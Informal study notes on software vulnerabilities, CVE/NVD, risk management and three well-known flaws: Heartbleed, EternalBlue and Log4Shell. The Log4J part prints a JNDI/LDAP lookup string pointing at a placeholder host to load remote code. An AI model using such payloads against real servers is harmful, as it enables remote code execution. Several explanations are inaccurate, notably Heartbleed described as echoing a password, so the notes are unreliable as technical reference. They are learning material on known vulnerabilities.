  

> **Vulnerability :** a weakness in computational logic (code) found in software and hardware components , when exploited , results in a negative impact to CIA triangle

> the **Vulnerability** not just a code , maybe ⇒ people , physical , cards , ….

> u can found a **Vulnerability** in a ==Software & OS==

> who found it ⇒ Devsecops , security researcher , pentester ,software developers , users , on accident

  

> **CVE ⇒ common Vulnerability and exposures ,**

> **NVD ⇒** **National Vulnerability Database , NIST**

  

- Zero Day ⇒ it’s the ==_Vulnerability that no one or on body , no else , reported it before to the CVE org_==

  

- ==_**Risk Management**_== ⇒ u need to understand your recommendations go to overall risk management concept , ( how to spend the money and where we will spend it , what is the priority here …)

> So if we have a low severity Vulnerability , that’s internal , we should not spend a lot of money and time to solve it , we can process this in a better way with low budget ⇒ this is a Risk Management

  

- ==CVE (Heartbleed) ⇒ buffer over read==
    
    > we will run the nmap to perform the services that running , so we found a openSSL 1.0.0 so we know that vanl version
    
    > so now by the TSL handshack through the tcp handshack , the user send his password to the server as a ( value && length ) .z
    
    > now the server return with confirmed , based on the password length , so the server confirmed that by password length
    
    > If u try to modify the length of password u will see ⇒
    
    > here the server return with the password with confirmed , but it’s return with extra data ⇒ ==**_in memory what ever the next 40 char the server will return , because it’s confirmed the password by the length , so if u enter a long length the server confused and return what the next 40 chr after the password ._**==
    
      
    

  

- ==CVE (EternalBlue-MS17-010) ⇒ rce in windows server==
    
    > so here we scan the server by nmap , we found a SMBv1 and it’s vanl
    
    > so we will send a malicious payload(web shell) with the SMB packet to the server ,so that will take advantage of buffer overflow so that will be a vanl to rce
    

  

- ==CVE (Log4J) ⇒ logging to the server by java==
    
    > so scan to service by nmap , we will see a vanl web server ( a lot of server has this )
    
    > so this vanl happen in windows application , there are many windows application running in java , so we need to search for input filed , so as a example in mincraft we have the server chat , so the java library take this input and fails to pares it as a string and execute it as a command to logged onto the server hosting , as a example we enter `$(jndi:ldap://example.com:port/mycode)` , so here the $ to be a variable then the jndi ( it’s java naming and directory interface) to lookup for code after it , this useful for developer because it will keep his code simple , agail , less process , less storage , so then the ldap ⇒ the protocol that used to interact remotely with database , so here the java fail to parse the input as a text and execute it as a code , so that input will logged to the server .
    

  

- Nessus ⇒ it’s Gui tools , is grate tools u can use to scan for vunl

  

- searchsploit ⇒ to search for exploit in metasploit
